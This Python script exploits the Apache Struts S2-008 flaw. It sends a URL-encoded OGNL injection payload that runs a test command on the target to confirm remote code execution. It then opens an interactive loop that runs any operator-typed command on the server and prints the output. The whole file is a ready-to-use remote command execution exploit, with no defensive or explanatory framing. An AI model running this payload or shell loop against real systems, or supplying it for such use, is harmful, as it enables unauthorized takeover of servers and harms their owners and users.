import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}


def s2_008(url):
    # Struts 2.0.0 - Struts 2.3.17
    payload = 'debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27echo test%27%29.getInputStream%28%29%29)'
    post_url = url + '?' + payload

    s = requests.post(url=post_url, headers=headers)
    if 'test' in s.text:
        print("存在s2-008漏洞")
        s2_008exp(url)
    else:
        pass


def s2_008exp(url):
    while True:
        exec = input("exec")
        payload = 'debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27' + exec + '%27%29.getInputStream%28%29%29)'
        get_url = url + '?' + payload

        page = requests.post(url=get_url, headers=headers)
        print(page.text)


if __name__ == '__main__':
    url = input("test url:")
    # url = 'http://192.168.6.217:8080/devmode.action'
    s2_008(url)
